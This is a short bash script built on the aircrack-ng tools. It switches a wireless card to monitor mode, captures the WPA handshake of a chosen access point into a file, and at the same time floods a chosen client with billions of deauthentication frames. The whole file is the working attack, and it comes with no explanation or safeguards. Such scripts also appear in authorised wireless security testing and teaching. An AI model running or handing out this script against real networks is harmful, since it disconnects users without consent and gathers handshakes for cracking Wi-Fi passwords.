# set input parameters
interface=$1
channel=$2
router_mac=$3
target_mac=$4

echo $router_mac
# activate monitor mode for the interface
ifconfig $interface down 
iw $interface set monitor control
ifconfig $interface up  

airmon-ng start $interface $channel

#kill network process
airmon-ng check kill

airodump-ng  --channel $channel --bssid $router_mac --write wpa_handshake $interface &
aireplay-ng --deauth 9000000000 -a $router_mac -c $target_mac $interface 
